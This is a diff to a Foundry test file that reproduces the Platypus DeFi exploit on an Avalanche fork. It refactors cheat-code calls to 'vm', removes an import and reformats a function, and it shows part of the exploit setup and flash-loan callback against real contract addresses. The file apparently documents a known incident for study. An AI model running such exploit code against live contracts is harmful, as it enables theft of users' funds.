@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @Analsis
 // https://twitter.com/peckshield/status/1626367531480125440
@@ -65,22 +64,20 @@ contract ContractTest is Test {
     PlatypusTreasure Treasure = PlatypusTreasure(0x061da45081ACE6ce1622b9787b68aa7033621438);
     IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("Avalanche", 26_343_613);
-        cheats.label(address(USDC), "USDC");
-        cheats.label(address(USP), "USP");
-        cheats.label(address(USDC_E), "USDC_E");
-        cheats.label(address(USDT), "USDT");
-        cheats.label(address(USDT_E), "USDT_E");
-        cheats.label(address(BUSD), "BUSD");
-        cheats.label(address(DAI_E), "DAI_E");
-        cheats.label(address(LPUSDC), "LPUSDC");
-        cheats.label(address(Pool), "Pool");
-        cheats.label(address(Master), "Master");
-        cheats.label(address(Treasure), "Treasure");
-        cheats.label(address(aaveV3), "aaveV3");
+        vm.createSelectFork("Avalanche", 26_343_613);
+        vm.label(address(USDC), "USDC");
+        vm.label(address(USP), "USP");
+        vm.label(address(USDC_E), "USDC_E");
+        vm.label(address(USDT), "USDT");
+        vm.label(address(USDT_E), "USDT_E");
+        vm.label(address(BUSD), "BUSD");
+        vm.label(address(DAI_E), "DAI_E");
+        vm.label(address(LPUSDC), "LPUSDC");
+        vm.label(address(Pool), "Pool");
+        vm.label(address(Master), "Master");
+        vm.label(address(Treasure), "Treasure");
+        vm.label(address(aaveV3), "aaveV3");
     }
 
     function testExploit() external {
@@ -107,13 +104,10 @@ contract ContractTest is Test {
         );
     }
 
-    function executeOperation(
-        address asset,
-        uint256 amount,
-        uint256 premium,
-        address initator,
-        bytes calldata params
-    ) external returns (bool) {
+    function executeOperation(address asset, uint256 amount, uint256 premium, address initator, bytes calldata params)
+        external
+        returns (bool)
+    {
         USDC.approve(address(aaveV3), amount + premium);
         USDC.approve(address(Pool), amount);
         Pool.deposit(address(USDC), amount, address(this), block.timestamp); // deposit USDC to LP-USDC
